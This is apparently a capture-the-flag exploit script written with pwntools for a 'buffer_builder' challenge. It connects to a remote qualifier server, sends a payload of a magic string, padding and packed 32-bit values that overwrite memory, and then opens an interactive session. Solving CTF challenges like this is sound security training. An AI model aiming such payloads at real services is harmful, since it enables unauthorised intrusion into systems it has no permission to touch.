from pwn import *

# r = process('./buffer_builder')
r = remote('buffer.pwn.quals.r2s.tw', 34568)
payload = 'bUiLdE_7h3_Buff3r!' + 'A'*2 + p32(3735928559) + p32(322376503) + p32(858993459) + p32(1686521154)
r.recvline()
r.recvline()
print(payload)

raw_input('>')
r.sendline(payload)
r.interactive()
